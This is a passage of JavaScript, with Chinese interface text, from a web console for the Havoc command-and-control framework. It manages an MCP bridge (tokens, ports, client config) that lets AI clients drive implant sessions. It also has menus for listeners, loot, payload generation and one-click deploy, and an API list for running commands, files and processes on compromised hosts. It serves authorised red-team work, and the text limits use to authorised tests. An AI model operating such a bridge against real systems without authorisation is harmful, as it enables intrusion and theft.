  el.querySelector(".mcp-port-input").addEventListener("keydown", (ev) => {
    if (ev.key === "Enter") mcpApplyPort(el);
  });
  el.querySelector(".mcp-copy-http").addEventListener("click", () => mcpCopyClientConfig("http"));
  el.querySelector(".mcp-copy-stdio").addEventListener("click", () => mcpCopyClientConfig("stdio"));
  el.querySelector(".mcp-toggle-tools").addEventListener("click", () => {
    const grid = el.querySelector(".mcp-tool-grid");
    const btn = el.querySelector(".mcp-toggle-tools");
    const show = grid.classList.contains("hidden");
    grid.classList.toggle("hidden", !show);
    btn.textContent = show ? "折叠" : "展开";
  });

  refreshMcpPane(el);
}

async function refreshMcpPane(el) {
  if (!el || !el.isConnected) return;
  try {
    const st = await api("/api/mcp/status");
    if (!el.isConnected) return;
    applyMcpStatus(el, st);
  } catch (err) {
    if (!el.isConnected) return;
    const badge = el.querySelector(".mcp-badge");
    if (badge) badge.className = "mcp-badge stopped";
    const state = el.querySelector(".mcp-state");
    if (state) state.textContent = "状态不可用";
    const error = el.querySelector(".mcp-error");
    if (error) { error.textContent = `读取 MCP 状态失败：${err.message}`; error.classList.remove("hidden"); }
    const toggle = el.querySelector(".mcp-toggle");
    if (toggle) { toggle.disabled = true; toggle.textContent = "不可用"; }
  }
}

function applyMcpStatus(el, st, fromWs = false) {
  if (!el || !st) return;
  S.mcpStatus = st;
  const stateWord = st.status === "running" ? "运行中" : (st.status === "disabled" ? "配置已禁用" : "已停止");
  const badge = el.querySelector(".mcp-badge");
  if (badge) {
    badge.className = "mcp-badge " + (st.status || "stopped");
    badge.querySelector(".mcp-state").textContent = stateWord;
  }
  const meta = el.querySelector(".mcp-meta");
  if (meta) {
    if (st.status === "running") {
      meta.textContent = `启动于 ${st.started_at_text || "—"} · 已运行 ${mcpUptime(st.uptime)}`;
    } else if (st.status === "disabled") {
      meta.textContent = "config.json → mcp.enabled=false，页面只读";
    } else {
      meta.textContent = "已停止 · POST/GET/DELETE /mcp 返回 503，浏览器 REST/WS 不受影响";
    }
  }
  const toggle = el.querySelector(".mcp-toggle");
  if (toggle) {
    toggle.disabled = !st.enabled;
    toggle.dataset.action = st.running ? "stop" : "start";
    toggle.textContent = !st.enabled ? "配置已禁用" : (st.running ? "停止 MCP" : "启动 MCP");
    toggle.classList.toggle("primary", !!st.enabled && !st.running);
    toggle.classList.toggle("danger", !!st.running);
    toggle.title = st.enabled ? "" : "请先把 config.json → mcp.enabled 改为 true 并重启网关";
  }
  const setText = (sel, value) => {
    const node = el.querySelector(sel);
    if (node) node.textContent = value == null || value === "" ? "—" : String(value);
  };
  setText(".mcp-endpoint", st.endpoint);
  const portInput = el.querySelector(".mcp-port-input");
  if (portInput) {
    if (document.activeElement !== portInput) portInput.value = String(st.port || 0);
    portInput.disabled = !st.enabled;
  }
  const portApply = el.querySelector(".mcp-port-apply");
  if (portApply) portApply.disabled = !st.enabled;
  const portNote = el.querySelector(".mcp-port-note");
  if (portNote) {
    portNote.textContent = st.port > 0
      ? `独立端口 ${st.port}；WebUI 仍在 ${st.web_port}，${st.web_port}/mcp 已停止提供。填 0 可恢复复用 WebUI 端口。`
      : `0 = 复用 WebUI 端口 ${st.web_port}；填 1..65535 可让 MCP 只监听独立端口。`;
  }
  setText(".mcp-transport", st.transport === "streamable-http" ? "Streamable HTTP" : st.transport);
  setText(".mcp-protocols", (st.protocols || []).join(" · "));
  setText(".mcp-sessions", `${st.mcp_sessions || 0} 个`);
  setText(".mcp-base", st.gateway_base);
  setText(".mcp-token-file", st.token_file);
  setText(".mcp-token-masked", st.token_masked);
  setText(".mcp-count-tools", st.tool_count || 0);
  setText(".mcp-count-resources", st.resource_count || 0);
  setText(".mcp-count-prompts", st.prompt_count || 0);
  setText(".mcp-res-list", (st.resources || []).join("  "));
  setText(".mcp-prompt-list", (st.prompts || []).join("  "));

  const note = el.querySelector(".mcp-token-note");
  if (note) {
    note.textContent = st.token_can_rotate
      ? "令牌文件 0600；复制/显示/轮换都会写审计事件，轮换会立即断开现有 MCP 客户端。"
      : "令牌由 config.json → mcp.token 固定，页面无法轮换；如需轮换请改用 run/mcp.token。";
  }
  const rotate = el.querySelector(".mcp-rotate-token");
  if (rotate) rotate.disabled = !st.token_can_rotate;

  const cfg = st.client_config || {};
  const httpText = cfg.http ? JSON.stringify(cfg.http, null, 2) : "—";
  const stdioText = cfg.stdio ? JSON.stringify(cfg.stdio, null, 2) : "—";
  setText(".mcp-cfg-http", httpText);
  setText(".mcp-cfg-stdio", stdioText);

  const grid = el.querySelector(".mcp-tool-grid");
  if (grid) {
    grid.innerHTML = (st.tools || []).map((name) => `<code>${escapeHtml(name)}</code>`).join("");
    if (!(st.tools || []).length) grid.innerHTML = `<span class="dim">无可用工具（MCP 未初始化）</span>`;
  }

  const events = el.querySelector(".mcp-events");
  if (events) {
    const rows = (st.recent_events || []).slice().reverse();
    events.innerHTML = rows.length ? rows.map((ev) => `
      <div class="mcp-event">
        <span class="mcp-ev-level ${escapeHtml(ev.level || "info")}"></span>
        <span class="mcp-ev-time">${escapeHtml(ev.time || "")}</span>
        <span class="mcp-ev-text">${escapeHtml(ev.text || "")}</span>
      </div>`).join("") : `<div class="dim">暂无 MCP 相关事件</div>`;
  }

  const error = el.querySelector(".mcp-error");
  if (error) {
    if (st.last_error) {
      error.textContent = `最近错误：${st.last_error}`;
      error.classList.remove("hidden");
    } else {
      error.textContent = "";
      error.classList.add("hidden");
    }
  }
  if (fromWs) {
    const action = st.status === "running" ? "启动" : "停止";
    toast(`MCP 状态已更新：${stateWord}`, st.status === "running" ? "good" : "warn");
    if (st.status === "running") console.info(`[MCP] ${action}`, st.endpoint);
  }
}

async function mcpControl(action, el) {
  if (action === "stop" && !await confirmDialog(
    "停止 MCP 服务？",
    "停止后 POST/GET/DELETE /mcp 都会返回 503，现有 MCP 客户端会话立即失效；" +
    "浏览器 REST/WS、投递链与 Python SDK 不受影响。可在同一页面重新启动。")) return false;
  try {
    const st = await api(`/api/mcp/${action}`, { method: "POST" });
    toast(action === "start" ? "MCP 已启动" : "MCP 已停止", action === "start" ? "good" : "warn");
    if (el) applyMcpStatus(el, st);
    return true;
  } catch (err) {
    toast(`MCP ${action === "start" ? "启动" : "停止"}失败：${err.message}`, "error");
    if (el) refreshMcpPane(el);
    return false;
  }
}

function mcpMenuControl(action) {
  const tab = S.tabs.get("mcp");
  if (!tab) openTab("mcp", { kind: "mcp", title: "MCP 管理" });
  const el = S.tabs.get("mcp") ? S.tabs.get("mcp").el : null;
  mcpControl(action, el);
}

async function mcpApplyPort(el) {
  const input = el.querySelector(".mcp-port-input");
  const button = el.querySelector(".mcp-port-apply");
  if (!input) return false;
  const raw = String(input.value || "").trim();
  if (!/^\d+$/.test(raw)) {
    toast("端口必须是 0..65535 的整数", "warn");
    return false;
  }
  const port = Number(raw);
  if (!Number.isInteger(port) || port < 0 || port > 65535) {
    toast("端口必须是 0..65535 的整数", "warn");
    return false;
  }
  const current = (S.mcpStatus && S.mcpStatus.port) || 0;
  const active = !!(S.mcpStatus && S.mcpStatus.listener_active);
  if (port === current && (port === 0 || active)) {
    toast("端口未变化", "info");
    return false;
  }
  const target = port === 0
    ? "复用 WebUI 端口"
    : `独立端口 ${port}（WebUI 端口将不再提供 /mcp）`;
  if (S.mcpStatus && S.mcpStatus.status === "running" && !await confirmDialog(
    "修改 MCP 监听端口？",
    `将切换到${target}，并重新绑定监听；现有 MCP 会话会失效，客户端需用新端点重新 initialize。`)) {
    input.value = String(current);
    return false;
  }
  if (button) button.disabled = true;
  try {
    const st = await api("/api/mcp/port", { method: "POST", body: { port } });
    applyMcpStatus(el, st);
    toast(`MCP 端口已切换：${st.effective_port}`, "good");
    return true;
  } catch (err) {
    toast(`修改端口失败：${err.message}`, "error");
    input.value = String(current);
    return false;
  } finally {
    if (button) button.disabled = false;
  }
}

async function mcpFetchToken() {
  const data = await api("/api/mcp/token");
  if (!data || !data.token) throw new Error("网关未返回令牌");
  return data.token;
}

async function mcpCopyToken(el) {
  try {
    const token = await mcpFetchToken();
    copyText(token);
  } catch (err) { toast(`读取令牌失败：${err.message}`, "error"); }
}

async function mcpShowToken(el) {
  if (!await confirmDialog("显示完整 MCP 令牌？", "令牌等同于操作员权限。请确认屏幕未被共享或录制，读完请关闭弹窗。")) return;
  try {
    const token = await mcpFetchToken();
    openModal("MCP 令牌", `<div class="modal-note">
      <b>令牌：</b><code class="mcp-token-plain">${escapeHtml(token)}</code><br><br>
      此令牌可调用全部 /api/* 与 /mcp，等同操作员权限；不要写入文档、聊天或截图。
    </div>`, [
      { label: "关闭", action: closeModal },
      { label: "复制", primary: true, action: () => copyText(token) },
    ]);
  } catch (err) { toast(`读取令牌失败：${err.message}`, "error"); }
}

async function mcpRotateToken(el) {
  if (!await confirmDialog(
    "轮换 MCP 令牌？",
    "新令牌写入 run/mcp.token（0600），旧令牌立即失效，所有现有 MCP 会话/客户端会被断开；" +
    "stdio 客户端需要重新读取令牌文件。浏览器 REST/WS 不受影响。")) return false;
  try {
    const res = await api("/api/mcp/token/rotate", { method: "POST" });
    if (res.status && el) applyMcpStatus(el, res.status);
    openModal("MCP 令牌已轮换", `<div class="modal-note">
      <b>新令牌：</b><code>${escapeHtml(res.token || "")}</code><br>
      <b>文件：</b><code>${escapeHtml(res.token_file || "")}</code>（0600）<br><br>
      旧令牌已立即失效，所有 MCP 客户端需用新令牌重新 initialize；
      stdio 客户端重新读取令牌文件即可。
    </div>`, [
      { label: "关闭", action: closeModal },
      { label: "复制新令牌", primary: true, action: () => copyText(res.token || "") },
    ]);
    toast("MCP 令牌已轮换", "warn");
    return true;
  } catch (err) {
    toast(`轮换失败：${err.message}`, "error");
    return false;
  }
}

async function mcpCopyClientConfig(kind) {
  const st = S.mcpStatus;
  const cfg = st && st.client_config && st.client_config[kind];
  if (!cfg) { toast("客户端配置尚未加载", "warn"); return; }
  try {
    const clone = JSON.parse(JSON.stringify(cfg));
    if (kind === "http") {
      const token = await mcpFetchToken();
      const entry = (clone.mcpServers || {})["havoc-webui"];
      if (entry && entry.headers) entry.headers.Authorization = `Bearer ${token}`;
    }
    copyText(JSON.stringify(clone, null, 2));
  } catch (err) { toast(`复制失败：${err.message}`, "error"); }
}

/* ================================================================
   菜单 / 右键菜单 / 弹窗
   ================================================================ */
const MENUS = {
  havoc: [
    { label: "新建客户端", action: () => window.open(location.href, "_blank", "noopener") },
    { sep: true },
    { label: "断开连接", action: () => disconnectTeamserver() },
    { label: "退出", action: doLogout },
    { sep: true },
    { label: "重新连接 teamserver", action: () => reconnectTeamserver() },
  ],
  view: [
    { label: "监听器", action: () => openTab("listeners", { kind: "listeners", title: "监听器" }) },
    { sep: true },
    { label: "会话视图", submenu: [
      { label: "表格", action: () => showMainView("table") },
      { label: "拓扑图", action: () => showMainView("graph") },
    ] },
    { label: () => (S.showDeliveryEdges === false ? "□ " : "✓ ") + "投递链虚线",
      action: () => { S.showDeliveryEdges = S.showDeliveryEdges === false; refreshGraph(); } },
    { sep: true },
    { label: "团队聊天", action: () => openTab("chat", { kind: "chat", title: "团队聊天" }) },
    { label: "战利品", action: () => openTab("loot", { kind: "loot", title: "战利品" }) },
    { sep: true },
    { label: "事件查看器", action: () => toggleEventDock(true) },
    { label: "团队服务器", action: () => openTab("teamserver", { kind: "teamserver", title: "团队服务器" }) },
  ],
  attack: [
    { label: "载荷生成", action: () => openPayloadDialog() },
    { label: "扩展", action: () => openTab("store", { kind: "store", title: "扩展" }) },
    { sep: true },
    { label: "一键上线", action: () => {
        openTab("listeners", { kind: "listeners", title: "监听器" });
        setTimeout(() => { const el = document.querySelector(".quick-deploy"); if (el) { el.classList.remove("hidden"); el.scrollIntoView({ block: "center" }); } }, 100);
      } },
  ],
  mcp: [
    { label: "MCP 管理", action: () => openTab("mcp", { kind: "mcp", title: "MCP 管理" }) },
    { sep: true },
    { label: "启动 MCP", action: () => mcpMenuControl("start") },
    { label: "停止 MCP", action: () => mcpMenuControl("stop") },
  ],
  scripts: [
    { label: "脚本管理", action: () => openTab("scripts", { kind: "scripts", title: "脚本管理" }) },
    { label: "脚本控制台", action: () => openTab("pyconsole", { kind: "pyconsole", title: "脚本控制台" }) },
  ],
  help: [
    { label: "关于", action: () => {
        const c = S.conn || {};
        const healthy = Array.from(S.sessions.values()).filter((x) => x.health === "healthy").length;
        openModal("关于 Havoc Web Console", `<div class="modal-note">
          <b>Havoc Web Console</b> · Havoc 0.7<br>
          复用 teamserver 的 JSON over WebSocket 协议，界面按 Qt 客户端（hexhub 深色主题）复刻。<br><br>
          <b>Teamserver：</b>${escapeHtml(c.teamserver || "—")}<br>
          <b>操作员：</b>${escapeHtml(c.user || "—")}<br>
          <b>连接状态：</b>${escapeHtml(c.state || "—")} ${escapeHtml(c.detail || "")}<br>
          <b>会话 / 在线：</b>${S.sessions.size} / ${healthy}<br>
          <b>监听器：</b>${S.listeners.size}<br>
          <b>重连次数：</b>${c.reconnects || 0}<br><br>
          仅限已获得明确书面授权的测试环境使用。
        </div>`, [{ label: "关闭", action: closeModal }]);
      } },
    { sep: true },
    { label: "MCP 接入", action: async () => {
        let info = null;
        try { info = await api("/api/mcp/status"); } catch (e) { info = null; }
        const endpoint = (info && info.endpoint) || `${location.origin}/mcp`;
        const tools = info && info.tool_count ? `${info.tool_count} 个工具` : "MCP 工具";
        const tokenFile = (info && info.token_file) || "webui/run/mcp.token";
        const example = JSON.stringify({
          mcpServers: {
            "havoc-webui": {
              url: endpoint,
              headers: { Authorization: "Bearer <run/mcp.token 内容>" },
            },
          },
        }, null, 2);
        openModal("MCP 接入", `<div class="modal-note">
          <b>HTTP 端点：</b><code>${escapeHtml(endpoint)}</code><br>
          <b>鉴权：</b><code>Authorization: Bearer &lt;令牌&gt;</code><br>
          <b>令牌文件：</b><code>${escapeHtml(tokenFile)}</code>（0600）<br>
          <b>能力：</b>${escapeHtml(tools)}，覆盖会话/命令/文件/进程/监听器/聊天/事件/战利品/载荷/商店/脚本/Python<br>
          <b>stdio：</b><code>python3 webui/mcp_server.py --stdio</code><br><br>
          <b>客户端配置示例</b>
          <pre class="ts-pre" style="max-height:28vh">${escapeHtml(example)}</pre>
          启停、令牌复制/轮换与工具清单请打开「MCP 管理」页。<br>
          仅限已获得明确授权的测试环境使用。
        </div>`, [
          { label: "关闭", action: closeModal },
          { label: "打开管理页", primary: true, action: () => {
              closeModal();
              openTab("mcp", { kind: "mcp", title: "MCP 管理" });
            } },
        ]);
      } },
    { sep: true },
    { label: "打开文档", action: () => window.open("https://havocframework.com/docs/welcome", "_blank", "noopener") },
    { label: "打开 API 文档", action: () => openModal("API 参考", `<pre class="ts-pre" style="max-height:52vh">GET  /api/state
GET  /api/sessions
POST /api/sessions/{id}/command   {command}
POST /api/sessions/{id}/files     {path}
GET  /api/sessions/{id}/files
POST /api/sessions/{id}/processes
POST /api/sessions/{id}/processes/kill {pid}
POST /api/sessions/{id}/mark      {marked}
POST /api/sessions/{id}/remove
POST /api/sessions/{id}/exit      {method: thread|process}
GET  /api/listeners
POST /api/listeners               {name, protocol, ...}
PUT  /api/listeners/{name}
DELETE /api/listeners/{name}
GET  /api/chat
POST /api/chat                    {message}
GET  /api/loot
GET  /api/loot/{id}               ?thumb=1 | ?download=1
GET  /api/events?limit=&after=
POST /api/scripts/load|reload|unload {path}
POST /api/scripts/upload          multipart file
POST /api/python/repl             {code}
POST /api/teamserver/disconnect
POST /api/reconnect
GET  /api/stager/health
POST /api/stager/start
GET  /api/profile
GET  /api/mcp/info
GET  /api/mcp/status               MCP 运行态/令牌掩码/能力计数
POST /api/mcp/start | stop         运行时启停（仅登录 cookie）
POST /api/mcp/port                修改 MCP 监听端口（仅登录 cookie；0=复用 WebUI 端口）
GET  /api/mcp/token                读取完整令牌（仅登录 cookie，写审计）
POST /api/mcp/token/rotate         轮换令牌（仅登录 cookie）
POST /mcp                          MCP（Authorization: Bearer <run/mcp.token>）
WS   /ws</pre>`, [{ label: "关闭", action: closeModal }]) },
    { sep: true },
    { label: "GitHub 仓库", action: () => window.open("https://github.com/HavocFramework/Havoc", "_blank", "noopener") },
  ],
};

function openMenu(name, anchor) {
  const popup = $("#menu-popup");
  const items = MENUS[name] || [];
  renderMenuItems(popup, items);
  const rect = anchor.getBoundingClientRect();
  popup.style.left = `${Math.round(rect.left)}px`;
  popup.style.top = `${Math.round(rect.bottom)}px`;
  popup.classList.remove("hidden");
  hideSubmenu();
  $$(".menu").forEach((m) => m.classList.toggle("open", m === anchor));
}

function renderMenuItems(popup, items) {
  popup.innerHTML = "";
  items.forEach((item) => {
    if (item.sep) { popup.insertAdjacentHTML("beforeend", `<div class="menu-sep"></div>`); return; }
    const el = document.createElement("div");
    el.className = "menu-item" + (item.disabled ? " disabled" : "") + (item.submenu ? " has-sub" : "");
    const labelText = typeof item.label === "function" ? item.label() : item.label;
    el.innerHTML = `<span>${escapeHtml(labelText)}</span>` +
      (item.submenu ? `<span class="hint">▸</span>` : (item.hint ? `<span class="hint">${escapeHtml(item.hint)}</span>` : ""));
    if (item.submenu) {
      el.addEventListener("mouseenter", () => openSubmenu(el, item.submenu));
    } else if (!item.disabled) {
      el.addEventListener("mousedown", (ev) => {
        ev.stopPropagation();
        hideMenus();
        item.action && item.action();
      });
    }
    popup.appendChild(el);
  });
}

function openSubmenu(anchorEl, items) {
  const sub = $("#submenu-popup");
  renderMenuItems(sub, items);
  const rect = anchorEl.getBoundingClientRect();
  sub.style.left = `${Math.round(rect.right - 2)}px`;
  sub.style.top = `${Math.round(rect.top - 4)}px`;
  sub.classList.remove("hidden");
  const r = sub.getBoundingClientRect();
  if (r.right > window.innerWidth - 6) sub.style.left = `${Math.round(rect.left - r.width + 2)}px`;
  if (r.bottom > window.innerHeight - 6) sub.style.top = `${window.innerHeight - r.height - 6}px`;
}

function hideSubmenu() {
  $("#submenu-popup").classList.add("hidden");
}

function hideMenus() {
  $("#menu-popup").classList.add("hidden");
  $("#submenu-popup").classList.add("hidden");
  $("#context-menu").classList.add("hidden");
  $$(".menu").forEach((m) => m.classList.remove("open"));
}

function showContextMenu(x, y, items) {
  const menu = $("#context-menu");
  menu.innerHTML = "";
  items.forEach((item) => {
    if (item.sep) { menu.insertAdjacentHTML("beforeend", `<div class="menu-sep"></div>`); return; }
    const el = document.createElement("div");
    el.className = "menu-item" + (item.disabled ? " disabled" : "") + (item.submenu ? " has-sub" : "");
    if (item.submenu) {
      el.innerHTML = `<span>${escapeHtml(item.label)}</span><span class="hint">▸</span>`;
      el.addEventListener("mouseenter", () => openSubmenu(el, item.submenu));
    } else {
      el.textContent = item.label;
      if (!item.disabled) el.addEventListener("click", () => { hideMenus(); item.action(); });
    }
    menu.appendChild(el);
  });
  menu.style.left = `${x}px`;
  menu.style.top = `${y}px`;
  menu.classList.remove("hidden");
  const rect = menu.getBoundingClientRect();
  if (rect.right > window.innerWidth - 6) menu.style.left = `${window.innerWidth - rect.width - 6}px`;
  if (rect.bottom > window.innerHeight - 6) menu.style.top = `${window.innerHeight - rect.height - 6}px`;
}

function initTooltips() {
  const tip = $("#tooltip");
  let timer = null, current = null;
  const hide = () => {
    clearTimeout(timer);
    timer = null;
    current = null;
    tip.classList.add("hidden");
  };
  document.addEventListener("mouseover", (ev) => {
    const el = ev.target.closest("[title]");
    if (!el || el === current) return;
    hide();
    current = el;
    const text = el.getAttribute("title");
    el.setAttribute("data-tip", text);
    el.removeAttribute("title");
    timer = setTimeout(() => {
      tip.textContent = text;
      tip.classList.remove("hidden");
      const pad = 12;
      const r = tip.getBoundingClientRect();
      let x = ev.clientX + pad, y = ev.clientY + pad;
      if (x + r.width > window.innerWidth - 6) x = ev.clientX - r.width - pad;
      if (y + r.height > window.innerHeight - 6) y = ev.clientY - r.height - pad;
      tip.style.left = `${Math.max(4, x)}px`;
      tip.style.top = `${Math.max(4, y)}px`;
    }, 450);
  });
  document.addEventListener("mouseout", (ev) => {
    if (current && !current.contains(ev.relatedTarget)) hide();
  });
  document.addEventListener("mousedown", hide, true);
  window.addEventListener("blur", hide);
}

function openModal(title, bodyHtml, buttons, opts = {}) {
  const root = $("#modal-root");
  root.classList.remove("hidden");
  root.innerHTML = `
    <div class="modal${opts.className ? " " + opts.className : ""}">
      <div class="modal-head"><span>${escapeHtml(title)}</span><button class="icon-btn modal-x">×</button></div>
      <div class="modal-body">${bodyHtml}</div>
      <div class="modal-foot${opts.footAlign ? " " + opts.footAlign : ""}"></div>
    </div>`;
  const modal = root.querySelector(".modal");
  const foot = modal.querySelector(".modal-foot");
  const requestClose = () => {
    if (typeof opts.onClose === "function" && opts.onClose() === false) return;
    closeModal();
  };
  buttons.forEach((b) => {
    const btn = document.createElement("button");
    btn.className = "btn" + (b.primary ? " primary" : "") + (b.danger ? " danger" : "");
    btn.textContent = b.label;
    btn.addEventListener("click", () => b.action && b.action(modal));
    foot.appendChild(btn);
  });
  modal.querySelector(".modal-x").addEventListener("click", requestClose);
  root.addEventListener("mousedown", (ev) => { if (ev.target === root) requestClose(); }, { once: true });
  return modal;
}
function closeModal() {
  const root = $("#modal-root");
  root.classList.add("hidden");
  root.innerHTML = "";
}
function confirmDialog(title, note) {
  return new Promise((resolve) => {
    openModal(title, `<p class="modal-note">${escapeHtml(note || "")}</p>`, [
      { label: "取消", action: () => { closeModal(); resolve(false); } },
      { label: "确定", primary: true, action: () => { closeModal(); resolve(true); } },
    ]);
  });
}

async function reconnectTeamserver() {
  try {
    await api("/api/reconnect", { method: "POST" });
    toast("正在重新连接 teamserver…", "info");
  } catch (err) { toast(err.message, "error"); }
}

async function disconnectTeamserver() {
  const ok = await confirmDialog(
    "断开连接",
    "断开网关与 teamserver 的连接？\n断开期间命令下发会返回 503，自动重连暂停；" +
    "可从「Havoc → 重新连接 teamserver」恢复。Qt 客户端不受影响。");
  if (!ok) return;
  try {
    await api("/api/teamserver/disconnect", { method: "POST" });
    S.conn = Object.assign({}, S.conn, {
      state: "disconnected", detail: "已手动断开 teamserver 连接", manual: true,
    });
    updateConn();
    renderStatus();
    toast("已手动断开 teamserver（自动重连已暂停）", "warn", 5000);
  } catch (err) { toast(err.message, "error"); }
}

/* ================================================================
   定时刷新
   ================================================================ */
function tick() {
  if (S.activeTab && S.activeTab.startsWith("console:")) {
    const tab = S.tabs.get(S.activeTab);
    if (tab) updateConsoleFoot(tab.el, tab.demon);
  }
  $$("#sessions-body tr").forEach((tr) => {
    const id = tr.getAttribute("data-id");
    const s = S.sessions.get(id);
    if (!s) return;
    const cell = tr.querySelector("[data-heartbeat]");
    if (cell) {
      // 心跳列显示 teamserver 的绝对时间，只刷新 tooltip 的相对时间，避免每秒把
      // "10-11-2026 23:36:15" 覆盖回 "12s"。
      const text = heartbeatText(s);
      if (cell.textContent !== text) cell.textContent = text;
      const tip = heartbeatTitle(s);
      if (cell.getAttribute("title") !== tip) cell.setAttribute("title", tip);
      if (cell.hasAttribute("data-tip")) cell.setAttribute("data-tip", tip);
    }
    const st = statusMeta(s.health);
    const word = tr.querySelector(".status-word");
    if (word && word.textContent !== st.label) {
      word.className = `status-word ${st.cls}`;
      word.textContent = st.label;
    }
  });
  if (now() - S.stagerLast > 15) {
    S.stagerLast = now();
    if (Array.from(S.tabs.values()).some((t) => t.kind === "listeners")) refreshStager();
  }
}

/* ================================================================
   交互绑定
   ================================================================ */
function handleInteractions() {
  $$(".menu").forEach((menu) => {
    menu.addEventListener("mousedown", (ev) => {
      ev.stopPropagation();
      if (!menu.classList.contains("open")) openMenu(menu.dataset.menu, menu);
      else hideMenus();
    });
    menu.addEventListener("mouseenter", () => {
      if ($("#menu-popup").classList.contains("hidden")) return;
      openMenu(menu.dataset.menu, menu);
    });
  });
  document.addEventListener("mousedown", (ev) => {
    // 点击上下文菜单项时不能先把菜单隐藏，否则 click 不会派发到菜单项
    if (!ev.target.closest("#menu-popup") && !ev.target.closest("#submenu-popup") &&
        !ev.target.closest(".menu") && !ev.target.closest("#context-menu")) {
      hideMenus();
    }
  });
  document.addEventListener("keydown", (ev) => {
    if (ev.key === "Escape") { hideMenus(); closeModal(); return; }
    // 拓扑图快捷键（未聚焦输入框时）：+ / - / 0
    if (S.mainView !== "graph" || ev.ctrlKey || ev.metaKey || ev.altKey) return;
    if (ev.target && ev.target.closest && ev.target.closest("input, textarea, select, [contenteditable]")) return;
    const pane = $("#graph-pane");
    if (!pane || pane.classList.contains("hidden")) return;
    if (ev.key === "+" || ev.key === "=") { ev.preventDefault(); pane.querySelector(".graph-zoom-in")?.click(); }
    else if (ev.key === "-" || ev.key === "_") { ev.preventDefault(); pane.querySelector(".graph-zoom-out")?.click(); }
    else if (ev.key === "0") { ev.preventDefault(); pane.querySelector(".graph-fit")?.click(); }
  });
  $("#event-dock-close").addEventListener("click", () => toggleEventDock(false));
  const vsplit = $("#v-splitter");
  let vdrag = false;
  const resetDockWidth = () => {
    const dock = $("#event-dock");
    dock.style.flex = "0 0 30%";
    dock.style.width = "30%";
  };
  vsplit.addEventListener("dblclick", resetDockWidth);
  vsplit.addEventListener("mousedown", (ev) => {
    ev.preventDefault();
    vdrag = true;
    const dock = $("#event-dock");
    const split = $("#main-split");
    const rect = split.getBoundingClientRect();
    const move = (e) => {
      if (!vdrag) return;
      const w = rect.right - e.clientX - 4;
      const clamped = Math.max(200, Math.min(rect.width * 0.7, w));
      dock.style.flex = `0 0 ${clamped}px`;
      dock.style.width = `${clamped}px`;
    };
    const up = () => {
      vdrag = false;
      document.removeEventListener("mousemove", move);
      document.removeEventListener("mouseup", up);
    };
    document.addEventListener("mousemove", move);
    document.addEventListener("mouseup", up);
  });
  const splitter = $("#splitter");
  let dragging = false;
  splitter.addEventListener("mousedown", (ev) => {
    ev.preventDefault();
    dragging = true;
    const dock = $("#bottom-dock");
    const workspace = document.querySelector(".workspace");
    const rect = workspace.getBoundingClientRect();
    const move = (e) => {
      if (!dragging) return;
      const h = rect.bottom - e.clientY;
      const clamped = Math.max(120, Math.min(rect.height - 80, h));
      dock.style.height = `${clamped}px`;
    };
    const up = () => {
      dragging = false;
      document.removeEventListener("mousemove", move);
      document.removeEventListener("mouseup", up);
    };
    document.addEventListener("mousemove", move);
    document.addEventListener("mouseup", up);
  });
}

document.addEventListener("DOMContentLoaded", () => { init(); });
